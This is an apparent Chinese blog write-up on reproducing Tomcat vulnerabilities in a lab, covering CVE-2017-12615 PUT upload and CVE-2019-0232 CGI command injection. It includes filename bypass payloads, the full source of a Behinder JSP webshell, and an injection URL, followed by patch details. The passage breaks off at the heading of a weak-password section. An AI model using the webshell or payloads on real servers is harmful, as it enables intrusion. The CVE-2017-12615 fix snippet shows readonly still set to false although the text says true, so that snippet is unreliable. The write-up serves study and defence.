@@ -1,0 +1,2802 @@
+<!DOCTYPE HTML>
+<html lang="zh-CN">
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="keywords" content="Tomcat小结, 每天都要努力哇">
+    <meta name="description" content="分享者才是学习中最大的受益者！">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="renderer" content="webkit|ie-stand|ie-comp">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="format-detection" content="telephone=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="referrer" content="no-referrer-when-downgrade">
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+
+
+    <title>Tomcat小结 | 每天都要努力哇</title>
+    <link rel="icon" type="image/png" href="/favicon.png">
+
+    <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
+    <link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
+    <link rel="stylesheet" type="text/css" href="/css/matery.css">
+    <link rel="stylesheet" type="text/css" href="/css/my.css">
+
+    <script src="/libs/jquery/jquery.min.js"></script>
+
+<meta name="generator" content="Hexo 5.4.0">
+<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
+<link rel="alternate" href="/atom.xml" title="每天都要努力哇" type="application/atom+xml">
+</head>
+
+
+
+
+<body>
+    <header class="navbar-fixed">
+    <nav id="headNav" class="bg-color nav-transparent">
+        <div id="navContainer" class="nav-wrapper container">
+            <div class="brand-logo">
+                <a href="/" class="waves-effect waves-light">
+                    
+                    <img src="/medias/logo.png" class="logo-img" alt="LOGO">
+                    
+                    <span class="logo-span">每天都要努力哇</span>
+                </a>
+            </div>
+            
+
+<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
+<ul class="right nav-menu">
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/" class="waves-effect waves-light">
+      
+      <i class="fas fa-home" style="zoom: 0.6;"></i>
+      
+      <span>首页</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/tags" class="waves-effect waves-light">
+      
+      <i class="fas fa-tags" style="zoom: 0.6;"></i>
+      
+      <span>标签</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/categories" class="waves-effect waves-light">
+      
+      <i class="fas fa-bookmark" style="zoom: 0.6;"></i>
+      
+      <span>分类</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/archives" class="waves-effect waves-light">
+      
+      <i class="fas fa-archive" style="zoom: 0.6;"></i>
+      
+      <span>归档</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/about" class="waves-effect waves-light">
+      
+      <i class="fas fa-user-circle" style="zoom: 0.6;"></i>
+      
+      <span>关于</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/contact" class="waves-effect waves-light">
+      
+      <i class="fas fa-comments" style="zoom: 0.6;"></i>
+      
+      <span>留言板</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/friends" class="waves-effect waves-light">
+      
+      <i class="fas fa-address-book" style="zoom: 0.6;"></i>
+      
+      <span>友情链接</span>
+    </a>
+    
+  </li>
+  
+  <li>
+    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
+      <i id="searchIcon" class="fas fa-search" title="搜索" style="zoom: 0.85;"></i>
+    </a>
+  </li>
+</ul>
+
+
+<div id="mobile-nav" class="side-nav sidenav">
+
+    <div class="mobile-head bg-color">
+        
+        <img src="/medias/logo.png" class="logo-img circle responsive-img">
+        
+        <div class="logo-name">每天都要努力哇</div>
+        <div class="logo-desc">
+            
+            Never really desperate, only the lost of the soul.
+            
+        </div>
+    </div>
+
+    <ul class="menu-list mobile-menu-list">
+        
+        <li class="m-nav-item">
+	  
+		<a href="/" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-home"></i>
+			
+			首页
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/tags" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-tags"></i>
+			
+			标签
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/categories" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-bookmark"></i>
+			
+			分类
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/archives" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-archive"></i>
+			
+			归档
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/about" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-user-circle"></i>
+			
+			关于
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/contact" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-comments"></i>
+			
+			留言板
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/friends" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-address-book"></i>
+			
+			友情链接
+		</a>
+          
+        </li>
+        
+        
+        <li><div class="divider"></div></li>
+        <li>
+            <a href="https://github.com/Redamancy404/hexo-theme-matery" class="waves-effect waves-light" target="_blank">
+                <i class="fab fa-github-square fa-fw"></i>Fork Me
+            </a>
+        </li>
+        
+    </ul>
+</div>
+
+
+        </div>
+
+        
+            <style>
+    .nav-transparent .github-corner {
+        display: none !important;
+    }
+
+    .github-corner {
+        position: absolute;
+        z-index: 10;
+        top: 0;
+        right: 0;
+        border: 0;
+        transform: scale(1.1);
+    }
+
+    .github-corner svg {
+        color: #0f9d58;
+        fill: #fff;
+        height: 64px;
+        width: 64px;
+    }
+
+    .github-corner:hover .octo-arm {
+        animation: a 0.56s ease-in-out;
+    }
+
+    .github-corner .octo-arm {
+        animation: none;
+    }
+
+    @keyframes a {
+        0%,
+        to {
+            transform: rotate(0);
+        }
+        20%,
+        60% {
+            transform: rotate(-25deg);
+        }
+        40%,
+        80% {
+            transform: rotate(10deg);
+        }
+    }
+</style>
+
+<a href="https://github.com/Redamancy404/hexo-theme-matery" class="github-corner tooltipped hide-on-med-and-down" target="_blank"
+   data-tooltip="Fork Me" data-position="left" data-delay="50">
+    <svg viewBox="0 0 250 250" aria-hidden="true">
+        <path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path>
+        <path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2"
+              fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path>
+        <path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z"
+              fill="currentColor" class="octo-body"></path>
+    </svg>
+</a>
+        
+    </nav>
+
+</header>
+
+    
+
+
+
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/0.jpg')">
+    <div class="container" style="right: 0px;left: 0px;">
+        <div class="row">
+            <div class="col s12 m12 l12">
+                <div class="brand">
+                    <h1 class="description center-align post-title">Tomcat小结</h1>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+<main class="post-container content">
+
+    
+    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
+<style>
+    #articleContent h1::before,
+    #articleContent h2::before,
+    #articleContent h3::before,
+    #articleContent h4::before,
+    #articleContent h5::before,
+    #articleContent h6::before {
+        display: block;
+        content: " ";
+        height: 100px;
+        margin-top: -100px;
+        visibility: hidden;
+    }
+
+    #articleContent :focus {
+        outline: none;
+    }
+
+    .toc-fixed {
+        position: fixed;
+        top: 64px;
+    }
+
+    .toc-widget {
+        width: 345px;
+        padding-left: 20px;
+    }
+
+    .toc-widget .toc-title {
+        padding: 35px 0 15px 17px;
+        font-size: 1.5rem;
+        font-weight: bold;
+        line-height: 1.5rem;
+    }
+
+    .toc-widget ol {
+        padding: 0;
+        list-style: none;
+    }
+
+    #toc-content {
+        padding-bottom: 30px;
+        overflow: auto;
+    }
+
+    #toc-content ol {
+        padding-left: 10px;
+    }
+
+    #toc-content ol li {
+        padding-left: 10px;
+    }
+
+    #toc-content .toc-link:hover {
+        color: #42b983;
+        font-weight: 700;
+        text-decoration: underline;
+    }
+
+    #toc-content .toc-link::before {
+        background-color: transparent;
+        max-height: 25px;
+
+        position: absolute;
+        right: 23.5vw;
+        display: block;
+    }
+
+    #toc-content .is-active-link {
+        color: #42b983;
+    }
+
+    #floating-toc-btn {
+        position: fixed;
+        right: 15px;
+        bottom: 76px;
+        padding-top: 15px;
+        margin-bottom: 0;
+        z-index: 998;
+    }
+
+    #floating-toc-btn .btn-floating {
+        width: 48px;
+        height: 48px;
+    }
+
+    #floating-toc-btn .btn-floating i {
+        line-height: 48px;
+        font-size: 1.4rem;
+    }
+</style>
+<div class="row">
+    <div id="main-content" class="col s12 m12 l9">
+        <!-- 文章内容详情 -->
+<div id="artDetail">
+    <div class="card">
+        <div class="card-content article-info">
+            <div class="row tag-cate">
+                <div class="col s7">
+                    
+                    <div class="article-tag">
+                        
+                            <a href="/tags/Tomcat%E5%B0%8F%E7%BB%93/">
+                                <span class="chip bg-color">Tomcat小结</span>
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+                <div class="col s5 right-align">
+                    
+                    <div class="post-cate">
+                        <i class="fas fa-bookmark fa-fw icon-category"></i>
+                        
+                            <a href="/categories/%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2/" class="post-category">
+                                服务攻防
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+            </div>
+
+            <div class="post-info">
+                
+                <div class="post-date info-break-policy">
+                    <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
+                    2021-10-28
+                </div>
+                
+
+                
+
+                
+                <div class="info-break-policy">
+                    <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
+                    9k
+                </div>
+                
+
+                
+                <div class="info-break-policy">
+                    <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
+                    46 分
+                </div>
+                
+
+                
+            </div>
+        </div>
+        <hr class="clearfix">
+
+        
+        <!-- 是否加载使用自带的 prismjs. -->
+        <link rel="stylesheet" href="/libs/prism/prism.css">
+        
+
+        
+
+        <div class="card-content article-card-content">
+            <div id="articleContent">
+                <h1 id="Tomcat"><a href="#Tomcat" class="headerlink" title="Tomcat"></a>Tomcat</h1><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>Tomcat服务器是一个免费的开放源代码的web应用服务器，属于轻量级应用服务器，在中小型系统和并发访问用户不是很多的场合下被普遍使用，是开发和调试JSP程序的首选。可以这样认为，当在一台机器上配置好 Apache服务器，可利用它响应HTML页面的访问请求。实际上 Tomcat是 Apache服务器的扩展，但运行时它是独立运行的，所以当运行 tomcat时，它实际上作为一个与 Apache独立的进程单独运行的。</p>
+<p><strong>目前版本型号7~10版本</strong></p>
+<p><strong>默认端口：8080</strong></p>
+<h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>首先要有java的环境</p>
+<p><strong>注意：Tomcat的版本对与JAVA版本以及相应的JSP和 Servlet都是有要求的，Tomcat8版本以上的是需要Java7及以后的版本，所以需要对应JDK的版本来下载Tomcat的版本</strong></p>
+<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210718061945.png" alt="1619271446048"></p>
+<p>然后安装Tomcat  一路默认下来 就ok了</p>
+<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210718061946.png" alt="1619263844479"></p>
+<p>可以看到它的8080端口 已经开启了</p>
+<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210718061947.png" alt="1619263320303"></p>
+<p>访问一下</p>
+<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210718061948.png" alt="1619275501351"></p>
+<h2 id="Tomcat分析"><a href="#Tomcat分析" class="headerlink" title="Tomcat分析"></a>Tomcat分析</h2><h3 id="主要文件"><a href="#主要文件" class="headerlink" title="主要文件"></a>主要文件</h3><pre class="line-numbers language-none"><code class="language-none">1.server.xml：配置 tomcat启动的端口号、host主机、Context等
+2.web.xml:部署描述文件，这个web.xml中描述了一些默认的 servlet，部署每个 webapp时，都会调用这个文件，配置该web应用的默认 servlet 
+3：tomcat-users.xml:tomcat的用户密码与权限。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210718061949.png" alt="1619276500737"></p>
+<h3 id="上传目录"><a href="#上传目录" class="headerlink" title="上传目录"></a>上传目录</h3><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210718061950.png" alt="1619276550079"></p>
+<h2 id="Tomcat渗透"><a href="#Tomcat渗透" class="headerlink" title="Tomcat渗透"></a>Tomcat渗透</h2><h3 id="Tomcat任意文件写入-CVE-2017-12615）"><a href="#Tomcat任意文件写入-CVE-2017-12615）" class="headerlink" title="Tomcat任意文件写入(CVE-2017-12615）"></a>Tomcat任意文件写入(CVE-2017-12615）</h3><h4 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h4><p>Apache Tomcat7.0.0-7.0.81（默认配置）</p>
+<h4 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h4><p>这边我用vulhub</p>
+<pre class="line-numbers language-none"><code class="language-none">sudo service docker start 
+cd vulhub/tomcat/CVE-2017-12615
+sudo docker-compose build
+sudo docker-compose up -d<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210718061951.png" alt="1619279493073"></p>
+<p>去底层看看源码</p>
+<pre class="line-numbers language-none"><code class="language-none">sudo docker ps
+sudo docker exec -ti a3 bash
+cat conf/web.xml |grep readonly<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+
+
+<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210718061952.png" alt="1619279550159"></p>
+<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210718061953.png" alt="1619279602920"></p>
+<h4 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h4><p>产生是由于配置不当（非默认配置），将配置文件<code>conf/web.xml</code>中的 <code>readonly</code>设置为了 false，导致可以使用PUT方法上传任意文件，但限制了jsp后缀，不过对于不同平台有多种绕过方法</p>
+<h4 id="开始复现"><a href="#开始复现" class="headerlink" title="开始复现"></a>开始复现</h4><p>抓包  改位PUT  上传方式</p>
+<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210718061954.png" alt="1619279695848"></p>
+<p>去上传目录看看</p>
+<pre class="line-numbers language-none"><code class="language-none">/usr/local/tomcat/webapps/ROOT<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+
+
+<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210718061955.png" alt="1619279779246"></p>
+<p>成功上传</p>
+<h5 id="绕过，成功上传jsp"><a href="#绕过，成功上传jsp" class="headerlink" title="绕过，成功上传jsp"></a>绕过，成功上传jsp</h5><pre class="line-numbers language-none"><code class="language-none">1.Windows下不允许文件以空格结尾
+以PUT /a001.jsp%20 HTTP/1.1上传到 Windows会被自动去掉末尾空格
+2.WindowsNTFS流
+Put/a001.jsp::$DATA HTTP/1.1
+3. /在文件名中是非法的，也会被去除（Linux/Windows）
+Put/a001.jsp/http:/1.1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>可以看到上传a001.jsp 是成功绕过了</p>
+<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210718061956.png" alt="1619280114887"></p>
+<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210718061957.png" alt="1619280208227"></p>
+<p>其他两种我就不进行演示了 </p>
+<p>都是可以的</p>
+<p>上传马儿，这边我用冰蝎进行连接</p>
+<p><strong>注意：不能开代理</strong></p>
+<p>看看冰蝎server目录下的jsp马儿</p>
+<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210718061958.png" alt="1619280600919"></p>
+<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210718061959.png" alt="1619280689842"></p>
+<p>冰蝎的jsp马儿</p>
+<pre class="line-numbers language-none"><code class="language-none">&lt;%@page import="java.util.*,javax.crypto.*,javax.crypto.spec.*"%&gt;&lt;%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}%&gt;&lt;%if (request.getMethod().equals("POST")){String k="e45e329feb5d925b";session.putValue("u",k);Cipher c=Cipher.getInstance("AES");c.init(2,new SecretKeySpec(k.getBytes(),"AES"));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);}%&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+
+
+<pre class="line-numbers language-none"><code class="language-none">/*该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond*/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+
+
+<p>注意这边要用<code>/</code>进行绕过,上传jsp</p>
+<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210718062000.png" alt="1619281552614"></p>
+<p>也可以看到是成功上传的</p>
+<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210718062001.png" alt="1619281576850"></p>
+<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210718062002.png" alt="1619281594138"></p>
+<p>用冰蝎进行连接一下</p>
+<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210718062003.png" alt="1619281681804"></p>
+<h5 id="最新版本复现"><a href="#最新版本复现" class="headerlink" title="最新版本复现"></a>最新版本复现</h5><p>这边把这个漏洞的代码 粘贴进最新的版本</p>
+<p>不加的话  PUT 上传txt都是不可以的</p>
+<pre class="line-numbers language-none"><code class="language-none">&lt;init-param&gt;
+ &lt;param-name&gt;readonly&lt;/param-name&gt;
+ &lt;param-value&gt;false&lt;/param-value&gt;
+&lt;/init-param&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+
+<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210718062004.png" alt="1619316374088"></p>
+<p>保存退出 进行重启Tomcat</p>
+<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210718062005.png" alt="1619316427883"></p>
+<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210718062006.png" alt="1619316466768"></p>
+<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210718062007.png" alt="1619316534173"></p>
+<p>确实是可以成功写入的</p>
+<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210718062008.png" alt="1619316568424"></p>
+<p>进行PUT写入txt 发现它是可以的</p>
+<p>但是绕过，上传jsp  三种方法我都试了  是不行的</p>
+<h5 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h5><p>把readonly 改成true</p>
+<pre class="line-numbers language-none"><code class="language-none">&lt;init-param&gt;
+ &lt;param-name&gt;readonly&lt;/param-name&gt;
+ &lt;param-value&gt;false&lt;/param-value&gt;
+&lt;/init-param&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h3 id="Tomcat远程代码执行（CVE-2019-0232）"><a href="#Tomcat远程代码执行（CVE-2019-0232）" class="headerlink" title="Tomcat远程代码执行（CVE-2019-0232）"></a>Tomcat远程代码执行（CVE-2019-0232）</h3><h4 id="影响范围-1"><a href="#影响范围-1" class="headerlink" title="影响范围"></a>影响范围</h4><pre class="line-numbers language-none"><code class="language-none">Apache Tomcat 9.0.0.M1 to 9.0.17
+Apache Tomcat 8.5.0 to 8.5.39
+Apache Tomcat 7.0.0 to 7.0.93<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+
+
+<p>这边就用 Windows 8.5.39 进行复现</p>
+<h4 id="安装-1"><a href="#安装-1" class="headerlink" title="安装"></a>安装</h4><p>同样是先安装java</p>
+<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210718062009.png" alt="1619317164402"></p>
+<p>然后安装Tomcat</p>
+<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210718062010.png" alt="1619317181551"></p>
+<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210718062011.png" alt="1619317197793"></p>
+<p>访问一下</p>
+<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210718062012.png" alt="1619317352951"></p>
+<h4 id="漏洞原理-1"><a href="#漏洞原理-1" class="headerlink" title="漏洞原理"></a>漏洞原理</h4><p>漏洞相关的代码在 <code>tomcat\java\org\apache\catalina\servlets\CGIServlet.java</code>中，CGISerlvet提供了一个<code>cgi</code>的调用接口，在启用<code>enableCmdLineArguments</code>参数时，会根据<code>RFC 3875</code>来从Url参数中生成命令行参数，并把参数传递至Java的 <code>Runtime</code>执行。</p>
+<p><strong>这个漏洞是因为<code>Runtime.getRuntime().exec</code>在 Windows中和 Linux中底层实现不同导致的</strong></p>
+<p>Java的Runtime.getRuntime().exec在CGI调用这种情况下很难有命令注入。</p>
+<p>而 Windows中创建进程使用的是 CreateProcess，会将参数合并成字符串，作为 <code>lpComandLine</code>传入 CreateProcess。程序启动后调用<code> GetcommandLine</code>获取参数，并调用<code>CommandLineToArgw</code>传至argv</p>
+<p>在 Windows中，当<code>CreateProcess</code>中的参数为bat文件或是cmd文件时，会调用 cmd.exe，故最后会变成<code>cmd.exe /c "a001.bat dir"</code>，而Java的调用过程并没有做任何的转义，所以在 Windows下会存在漏洞。</p>
+<p>除此之外，Windows在处理参数方面还有一个特性，如果这里只加上简单的转义还是可能被绕过</p>
+<p>例如<code>dir "\"&amp;whoami"</code>在 Linux中是安全的，而在Windows会执行命令。<br>这是因为 Windows在处理命令行参数时，会将<code>"</code>中的内容拷贝为下一个参数，直到命令行结束或者遇到下一个<code>"</code>，但是对<code>"</code>的处理有误。因此在Java中调用批处理或者cmd文件时，需要做合适的参数检査才能避免漏洞岀现。</p>
+<h4 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h4><p>Tomcat的 CGI_Servlet组件默认是关闭的，在<code>conf/web.xml</code>中找到注释的 CGIServlet部分，去掉注释，并配置 enableCmdLineArguments和executable</p>
+<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210718062013.png" alt="1619326835356"></p>
+<p>就是配置这里</p>
+<pre class="line-numbers language-none"><code class="language-none">&lt;servlet&gt;
+    &lt;servlet-name&gt;cgi&lt;/servlet-name&gt;
+    &lt;servlet-class&gt;org.apache.catalina.servlets.CGIServlet&lt;/servlet-class&gt;
+    &lt;init-param&gt;
+        &lt;param-name&gt;cgiPathPrefix&lt;/param-name&gt;
+        &lt;param-value&gt;WEB-INF/cgi&lt;/param-value&gt;
+    &lt;/init-param&gt;
+	&lt;init-param&gt;
+        &lt;param-name&gt;enableCmdLineArguments&lt;/param-name&gt;
+		&lt;param-value&gt;true&lt;/param-value&gt;
+	&lt;/init-param&gt;
+	&lt;init-param&gt;
+	    &lt;param-name&gt;executable&lt;/param-name&gt;
+	    &lt;param-value&gt;&lt;/param-value&gt;
+	&lt;/init-param&gt;
+    &lt;load-on-startup&gt;5&lt;/load-on-startup&gt;
+&lt;/servlet&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+
+<p>这里主要的设置是enableCmdLineArguments和 executable两个选项</p>
+<pre class="line-numbers language-none"><code class="language-none">1.enableCmdLineArguments启用后才会将Url中的参数传递到命令行
+2.executable指定了执行的二进制文件，默认是perl，需要置为空才会执行文件本身。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+
+
+<p>同样在conf/web.xml中启用cgi的 servlet-mapping</p>
+<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210718062014.png" alt="1619326964457"></p>
+<p>修改conf/context.xml的添加 privileged=”true”属性，否则会没有权限</p>
+<pre class="line-numbers language-none"><code class="language-none">&lt;Context privileged="true"&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+
+
+
+
+<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210718062015.png" alt="1619327075870"></p>
+<p>配置目录文件</p>
+<p>在<code>C:\Tomcat\webapps\ROOT\WEB-INF</code>下创建<code>cgi-bin</code>目录</p>
+<p>并在该目录下创建一个a001.txt</p>
+<p>里面内容随意</p>
+<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210718062016.png" alt="1619327411223"></p>
+<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210718062017.png" alt="1619327400322"></p>
+<p>记得重启一下</p>
+<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210718062018.png" alt="1619327485133"></p>
+<p>然后我们访问</p>
+<pre class="line-numbers language-none"><code class="language-none">http://192.168.175.193:8080/cgi-bin/a001.bat?&amp;dir<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>可以看到成功任意代码执行！</p>
+<h4 id="修复方式"><a href="#修复方式" class="headerlink" title="修复方式"></a>修复方式</h4><p>开发者在 patch中增加了 <code>cmdLineArgumentsDecoded</code>参数，这个参数用来校验传入的命令行参数，如果传入的命令行参数不符合规定的模式，则不执行。<br>校验写在 setupFromRequest函数中</p>
+<pre class="line-numbers language-none"><code class="language-none">String decodedArgument = URLDecoder.decode(encodedArgument, parameterEncoding);
+if (cmdLineArgumentsDecodedPattern != null &amp;&amp;
+ !cmdLineArgumentsDecodedPattern.matcher(decodedArgument).matches()) {
+ if (log.isDebugEnabled()) {
+ log.debug(sm.getString("cgiServlet.invalidArgumentDecoded",
+ decodedArgument, cmdLineArgumentsDecodedPattern.toString()));
+ }
+ return false;
+}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>不通过时，会将 CGIEnvironment的<code>valid</code>参数设为 false，在之后的处理函数中会直接跳过执行</p>
+<pre class="line-numbers language-none"><code class="language-none">if (cgiEnv.isValid()) {
+ CGIRunner cgi = new CGIRunner(cgiEnv.getCommand(),
+ cgiEnv.getEnvironment(),
+ cgiEnv.getWorkingDirectory(),
+ cgiEnv.getParameters());
+ if ("POST".equals(req.getMethod())) {
+ cgi.setInput(req.getInputStream());
+ }
+ cgi.setResponse(res);
+ cgi.run();
+} else {
+ res.sendError(404);
+}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h4 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h4><pre class="line-numbers language-none"><code class="language-none">1.使用更新版本的 Apache Tomcat。这里需要注意的是，虽然在9.0.18就修复了这个漏洞，但这个更新是并没有通过候选版本的投票，所以虽然9.0.18没有在被影响的列表中，用户仍需要下载9.0.19的版本来获得没有该漏洞的版本
+2.关闭 enableCmdLineArguments参数<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+
+
+<h3 id="Tomcat弱口令-amp-后台getshell漏洞"><a href="#Tomcat弱口令-amp-后台getshell漏洞" class="headerlink" title="Tomcat弱口令&amp;后台getshell漏洞"></a>Tomcat弱口令&amp;后台getshell漏洞</h3><h4 id="影响范围-2"><a href="#影响范围-2" class="headerlink" title="影响范围"></a>影响范围</h4><p>Tomcat8</p>
